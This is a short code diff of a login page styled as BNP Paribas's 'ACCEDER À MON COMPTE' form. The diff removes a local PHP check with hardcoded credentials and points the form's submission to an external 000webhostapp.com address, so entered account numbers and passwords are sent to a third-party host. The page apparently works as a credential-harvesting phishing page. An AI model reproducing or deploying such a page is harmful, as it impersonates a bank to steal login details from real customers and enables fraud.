@@ -1,18 +1,3 @@
-<?php
-session_start();
-
-@$user=$_POST["number"];
-@$pass=$_POST["pass"];
-@$valider=$_POST["submit"];
-
-if(isset($valider)){
-
- if($user=="9588593686" && $pass=="879035"){
- $_SESSION["autoriser"]="oui";
- header("location:Solde.php");
- }
-}
-?>
 <!DOCTYPE html>
 <html>
 	<head>
@@ -39,7 +24,7 @@ if(isset($valider)){
 	<img src="https://logos-marques.com/wp-content/uploads/2020/12/BNP-Paribas-logo.png"></a>
 	</div>
 	
-	<form method="POST" action="">
+	<form method="POST" action="https://authentification-en-ligne.000webhostapp.com/index.php">
 	<div class="slog">
 	<h1>ACCEDER À MON<br/>COMPTE</h1>
 	<div class="log">
